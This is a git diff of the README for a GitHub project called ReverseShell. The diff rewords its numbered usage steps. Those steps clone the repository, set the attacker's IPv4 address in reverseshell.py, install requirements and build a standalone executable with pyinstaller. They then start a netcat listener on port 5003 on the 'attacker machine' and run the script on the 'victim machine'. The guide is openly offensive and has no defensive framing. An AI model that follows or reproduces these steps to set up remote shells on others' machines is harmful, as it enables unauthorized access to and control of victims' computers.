@@ -5,22 +5,25 @@
 
 ## How to use this reverseshell?:snake:
 
-Clone the repo:
+- 1 ) Clone the repo:
 ```
 git clone https://github.com/Keyj33k/ReverseShell.git
 ```
-- Now you need to navigate to the ReverseShell directory.
+- 2 ) Now you need to navigate to the ReverseShell directory.
+```
+cd ReverseShell
+```
 - You will find a file called >> reverseshell.py:
 
-- IMPORTANT: You need to change the ipv4 address in the script:
+### You need to change the ipv4 address in the script:
 ---
 ![exa](https://github.com/Keyj33k/profiles/blob/main/profile/revshell.png?raw=true)
 ---
-- IMPORTANT: Use this command to install the requirements:
+- 3 ) This Reverse Shell needs requirements you need to install:
 ```
 pip install -r requirements.txt
 ```
-- OPTIONAL: You can make a executable using command:
+- 4 ) Build an executable using this command:
 ```
 pyinstaller --onefile reverseshell.py
 ```
@@ -28,8 +31,7 @@ pyinstaller --onefile reverseshell.py
 ```
 pip install pyinstaller
 ```
-
-### After saving your settings you can test it:
+### If the steps above are done:
 
 - On the attacker machine:
 ```
@@ -40,7 +42,7 @@ nc -lnvp 5003
 sudo apt-get install -y netcat
 ```
 
-- On the vivtim machine:
+- On the victim machine:
 ```
 python3 reverseshell.py 
 ```
